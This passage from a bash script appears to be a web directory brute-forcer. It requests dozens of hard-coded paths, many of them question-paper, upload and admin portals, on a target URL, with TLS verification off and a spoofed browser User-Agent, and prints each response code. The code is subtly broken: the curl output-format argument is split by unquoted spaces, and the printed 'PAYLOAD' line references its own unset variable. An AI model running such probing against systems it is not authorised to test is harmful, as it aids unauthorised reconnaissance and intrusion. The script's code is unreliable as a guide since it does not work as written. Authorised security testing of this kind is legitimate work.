         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ServiceQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ServiceQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocPlatform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocPlatform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSyncQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSyncQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MgmtQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MgmtQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUploadTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUploadTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchDataOps/"" -H "User-Agent: Mozilla/5.0")
